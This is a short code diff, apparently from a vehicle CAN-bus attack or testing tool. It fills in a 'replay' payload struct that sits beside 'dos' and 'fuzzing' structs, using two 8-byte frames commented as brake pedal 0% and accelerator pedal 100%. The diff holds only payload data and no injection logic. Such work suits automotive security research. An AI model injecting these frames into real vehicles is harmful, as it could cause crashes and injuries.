@@ -11,7 +11,10 @@ struct payloads dos = {
 };
 
 struct payloads replay ={
-
+    .payload1 = {0x00, 0x00, 0xDF, 0x9D, 0x35, 0xEE, 0x12, 0x12},    //tx payload break pedal 0%
+    .payload2 = {0x0F, 0xC5, 0xD3, 0x99, 0xDD, 0x21, 0x12, 0x12},    //tx payload acceel pedal 100%
+    .payload1_len = 8,
+    .payload2_len = 8
 };
 
 struct payloads fuzzing = {
